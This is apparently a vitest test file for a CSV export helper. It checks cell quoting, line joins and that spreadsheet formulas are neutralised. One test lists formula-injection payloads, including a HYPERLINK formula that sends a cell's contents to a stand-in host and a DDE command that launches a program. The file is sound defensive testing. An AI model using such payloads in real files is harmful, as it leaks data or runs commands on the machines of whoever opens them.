import { describe, expect, it } from 'vitest'

import { csvCell, toCsv } from '../csv'

describe('csvCell', () => {
  it('quotes every cell and doubles quotes inside', () => {
    expect(csvCell('Minh Anh')).toBe('"Minh Anh"')
    expect(csvCell('Anh "Tí"')).toBe('"Anh ""Tí"""')
    expect(csvCell('0912345678')).toBe('"0912345678"')
    expect(csvCell('')).toBe('""')
  })

  it('keeps anything a spreadsheet would run as a formula as text', () => {
    const attacks = [
      '=HYPERLINK("https://evil.example/?d="&B2,"Xem")',
      "=cmd|' /C calc'!A0",
      '+1+1',
      '-2+3',
      '@SUM(A1:A9)',
      '\t=1+1',
      '\r=1+1',
    ]
    for (const value of attacks) expect(csvCell(value)).toMatch(/^"'/)
    expect(csvCell('=1+1')).toBe(`"'=1+1"`)
  })

  it('leaves formula characters alone when they are not first', () => {
    expect(csvCell('a=b')).toBe('"a=b"')
    expect(csvCell('an@example.com')).toBe('"an@example.com"')
  })
})

describe('toCsv', () => {
  it('joins rows with CRLF', () => {
    expect(
      toCsv([
        ['Tên', 'Ghi chú'],
        ['An', '=1+1'],
      ]),
    ).toBe(`"Tên","Ghi chú"\r\n"An","'=1+1"`)
  })
})
